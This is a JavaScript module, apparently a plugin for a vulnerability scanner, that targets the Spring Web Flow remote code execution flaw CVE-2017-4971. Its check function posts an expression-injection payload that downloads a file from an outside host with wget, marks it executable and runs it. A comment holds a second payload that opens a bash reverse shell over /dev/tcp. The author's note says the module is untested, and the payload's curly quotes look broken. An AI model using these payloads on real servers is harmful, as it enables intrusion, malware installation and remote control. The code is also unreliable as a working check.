// 还没有成功测试
module.exports={
	tags: "spring,cve-2017-4971,4917,parms,web",
	des: "spring cve-2017-4971 RCEVulnerability detection,CVE-2017-4971: Remote Code Execution Vulnerability In The Spring Web Flow Framework",
	dependencies:"java,ysoserial,base64,tr",
	VulApps:[
		"https://pivotal.io/security/cve-2017-4971"
	],
	urls:[
		"https://blog.gdssecurity.com/labs/2017/7/17/cve-2017-4971-remote-code-execution-vulnerability-in-the-spr.html",
		"https://github.com/vulhub/vulhub/tree/master/spring/CVE-2017-4971"
		
	],
/*
_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/10.0.0.1/21 0>&1")).start()=vulhub

*/
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this,_s = _t.self;
		var szOldUrl = url;
		_s.request(_s.fnOptHeader({method: 'POST',uri: url,
			data:'_new java.lang.ProcessBuilder({‘/bin/bash’,’-c’,’wget http://[REDACTED].209:8000/1 -O /tmp/1; chmod 700 /tmp/1; /tmp/1’}).start()='
		    ,headers:
		    {
		    	"User-Agent": _s.g_szUa,
		    	"Content-Type":'application/x-www-form-urlencoded'
		    }})
		  ,function (error, response, body)
		  {
		  	body = String(body);
		  	_s.fnShowBody(body);
	  		if(body)
	  		{
	  			body = _s.fnCheckVul1(String(body));
	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
	  			// console.log(url + "\n"+body);
	  			_s.fnDoBody(body,"cve-2017-4971",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":_s.g_postData};
	  				fnCbk(_s.copyO2O(r,o),_t);
	  			});
	  		}
		  }
		);
		
	}
};